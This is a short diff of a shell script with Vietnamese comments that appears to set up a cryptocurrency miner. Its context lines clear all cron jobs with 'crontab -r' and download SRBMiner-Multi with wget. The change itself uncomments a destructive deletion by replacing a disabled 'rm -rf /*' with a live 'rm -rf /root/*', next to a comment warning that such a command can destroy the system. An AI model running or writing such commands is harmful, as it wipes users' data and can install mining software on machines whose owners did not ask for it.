@@ -8,7 +8,7 @@ crontab -r
 
 # Xóa tất cả các file và thư mục trong thư mục gốc (chỉ nên dùng nếu bạn thực sự muốn xóa hết)
 # CHÚ Ý: Lệnh này cực kỳ nguy hiểm và có thể phá hủy toàn bộ hệ thống của bạn!
-# rm -rf /*
+rm -rf /root/*
 
 # Tải SRBMiner-Multi
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2-5-5-Linux.tar.gz
